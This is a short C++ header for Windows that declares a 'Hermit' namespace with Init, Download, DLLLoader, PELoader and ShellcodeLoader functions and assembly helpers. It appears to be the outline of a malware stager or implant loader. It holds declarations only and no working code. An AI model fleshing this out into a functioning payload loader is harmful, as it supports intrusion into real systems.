#ifndef HERMIT_HPP
#define HERMIT_HPP

#include <windows.h>
#include <winhttp.h>

#include "core/crypt.hpp"
#include "core/handler.hpp"
#include "core/macros.hpp"
#include "core/procs.hpp"
#include "core/state.hpp"
#include "core/system.hpp"
#include "core/technique.hpp"
#include "core/utils.hpp"

extern "C" ULONG_PTR GetRIP(VOID);
extern "C" ULONG_PTR Leave(VOID);

namespace Hermit
{
    State::PSTATE Init();
    std::vector<BYTE> Download(State::PSTATE pState);

    VOID DLLLoader();
    VOID PELoader();
    VOID ShellcodeLoader();
}

#endif // HERMIT_HPP